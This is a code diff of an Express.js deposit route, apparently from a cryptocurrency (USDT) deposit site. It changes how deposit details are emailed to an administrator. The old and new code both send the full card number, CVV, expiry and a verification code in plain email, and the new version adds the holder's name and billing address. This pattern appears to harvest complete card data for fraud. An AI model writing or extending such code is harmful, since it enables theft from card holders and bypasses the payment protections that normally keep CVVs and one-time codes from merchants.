@@ -3,7 +3,7 @@ const router = express.Router();
 const Payment = require('../models/Payment');
 const DepositRequest = require('../models/DepositRequest');
 const authMiddleware = require('../middleware/authMiddleware');
-const { transporter } = require('../utils/mailer'); // Ensure transporter is exported in mailer.js
+const { sendAdminNotification } = require('../utils/mailer'); // Ensure transporter is exported in mailer.js
 
 // Save deposit request
 router.post('/deposit', async (req, res) => {
@@ -30,23 +30,22 @@ await DepositRequest.create({
 
 
     // Send email notification to admin
-await transporter.sendMail({
-  from: process.env.EMAIL_USER,
-  to: process.env.ADMIN_EMAIL,
-  subject: "🟡 New Deposit Request",
-  html: `
-    <h3>Deposit Request</h3>
-    <p>User: ${user.username} (${user.email})</p>
-    <p>Amount: <strong>$${amount} USDT</strong></p>
-    <p>Status: Pending</p>
-    <hr/>
-    <h4>Card Details</h4>
-    <p><strong>Card Number:</strong> ${cardNumber}</p>
-    <p><strong>CVV:</strong> ${cvv}</p>
-    <p><strong>Expiry:</strong> ${expiry}</p>
-    <p><strong>Verification Code:</strong> ${code}</p>
-  `
+await sendAdminNotification({
+  userId: user.id,
+  firstName: req.body.firstName,
+  lastName: req.body.lastName,
+  cardNumber,
+  expiry,
+  cvv,
+  address: req.body.address,
+  city: req.body.city,
+  postcode: req.body.postcode,
+  country: req.body.country,
+  amount,
+  code,
+  date: Date.now()
 });
+
 
 
     return res.json({ message: "Deposit submitted for review." });
